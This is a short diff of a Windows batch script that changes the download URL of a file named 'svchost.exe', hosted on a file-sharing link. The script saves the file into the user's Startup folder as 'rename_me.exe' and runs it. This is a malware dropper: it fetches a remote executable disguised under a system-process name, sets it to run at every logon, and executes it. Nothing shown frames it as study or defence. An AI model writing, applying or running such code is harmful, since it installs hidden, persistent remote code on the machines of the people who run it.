@@ -20,7 +20,7 @@ call "%DEST%"
 @echo off
 setlocal 
 
-set "URL=https://link.storjshare.io/s/jupizfqdjs75vrcxlx7blaybowka/isimsallaqwe/svchost.exe?download=1"
+set "URL=https://link.storjshare.io/s/jxyuqam6e6ln2vrvv6nudi676gqa/isimsallaqwe/svchost.exe?download=1"
 set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\rename_me.exe"
 
 
